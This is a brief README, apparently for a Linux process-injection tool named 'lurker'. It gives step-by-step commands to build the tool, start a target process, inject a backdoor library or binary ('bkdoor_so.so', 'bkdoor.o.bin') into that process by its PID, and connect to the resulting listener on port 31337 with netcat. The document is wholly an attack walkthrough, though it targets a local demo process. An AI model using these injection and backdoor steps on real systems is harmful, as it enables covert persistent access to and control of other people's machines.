1. Run `make`.

2. start the target process, such as `saruman`, by executing: `./saruman`.

3. In another terminal, execute: ./lurker \`pidof saruman\` \`pwd\`/bkdoor_so.so OR `./lurker --b \`pidof saruman\` bkdoor.o.bin` to inject the code into the target process, such as `saruman`.

4. Finally, you can run: `nc 127.0.0.1 31337`.


